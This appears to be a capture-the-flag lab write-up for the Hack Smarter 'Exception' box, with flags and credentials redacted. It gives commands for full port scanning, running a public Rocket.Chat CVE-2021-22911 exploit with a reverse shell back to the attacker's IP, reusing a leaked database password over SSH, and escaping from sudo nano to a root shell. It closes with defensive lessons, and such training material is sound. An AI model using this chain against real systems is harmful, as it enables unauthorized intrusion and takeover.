Exception

Hack Smarter · Linux · A chat server on a port the fast scan missed carries a known NoSQL-injection flaw — and from there, a reused database password and a sudo-able editor lead to root.

A Hack Smarter lab, shared with permission. Credentials and flag values are redacted — the point is the method, not the answers.

1. Scan Everything

A quick RustScan shows only SSH and HTTP. But a full nmap -p- turns up a third service on 3000 that the fast scan missed — the single most important step on this box.

rustscan -a TARGET -- -A          # 22, 80 only
nmap -sS -p- -A TARGET            # also finds 3000

Port 80 is a plain web bot with nothing useful; port 3000 is a Rocket.Chat instance (its Meteor fingerprints give it away). Always confirm a fast scan with a full port sweep.

2. Rocket.Chat NoSQL Injection to RCE

This Rocket.Chat version is vulnerable to CVE-2021-22911, an unauthenticated NoSQL injection. A public proof of concept chains it into full code execution:

  • A $where / $regex injection in an anonymous method call leaks secrets character by character — a password-reset token and a 2FA seed.
  • Those let the exploit reset the administrator's password and satisfy 2FA.
  • As admin, it creates an incoming-webhook integration whose script runs server-side JavaScript — triggering the webhook runs a command.
python3 rocketchat.py -u LOWPRIV_EMAIL -U LOWPRIV_USER -p PASS \
  -a ADMIN_EMAIL -A ADMIN_USER -t http://TARGET:3000 \
  -H YOUR_IP -P 1337     # reverse shell via the integration script

The shell lands as the service account running the app.

3. Reused DB Password to a User

The application's configuration holds its MongoDB connection details — a database username and password. That password has been reused for a real local user's account, so it works straight over SSH.

env | grep -i database     # DATABASE_USER / DATABASE_PASSWORD
ssh USER@TARGET            # same password — user.txt

4. Sudo Editor to Root

Check sudo rights first. The user may run a “log inspector” helper as root without a password — and that helper opens nano as root.

sudo -l
# (root) NOPASSWD: /opt/log_inspector/check_log --clean
sudo /opt/log_inspector/check_log --clean   # launches nano as root

An editor running as root is a shell waiting to happen. From nano, open a command prompt and spawn a shell (GTFOBins):

# inside nano:  Ctrl+R then Ctrl+X, then run:
reset; sh 1>&0 2>&0

That drops to a root shell, and the root flag is readable.

What To Take Away

  • Fast scanners trade coverage for speed. Always follow up with a full -p- sweep — the whole box hinged on port 3000.
  • Match third-party apps to CVEs. Rocket.Chat 3.12.1 had a public unauthenticated RCE.
  • Don't reuse a service's database password for a login account.
  • Sudo to an interactive editor (nano, vi, less) is root via GTFOBins. Scope sudo rules tightly.
